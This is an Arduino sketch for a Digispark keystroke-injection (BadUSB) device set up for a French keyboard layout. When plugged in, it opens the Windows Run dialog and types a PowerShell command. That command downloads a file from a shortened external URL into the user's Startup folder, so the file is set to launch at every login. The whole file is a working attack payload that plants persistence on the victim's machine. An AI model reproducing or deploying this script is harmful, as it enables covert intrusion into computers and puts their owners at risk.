#include "DigiKeyboardFr.h"

void setup() {
  //open powershell
  DigiKeyboardFr.delay(1);
  DigiKeyboardFr.sendKeyStroke(KEY_R, 0 | MOD_GUI_LEFT );
  DigiKeyboardFr.delay(50);
  DigiKeyboardFr.println("powershell -command \"Invoke-WebRequest -Uri \\\"u.nu/d1uTS\\\" -Outfile \\\"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rl.url\\\"\"");
}

void loop() {
}
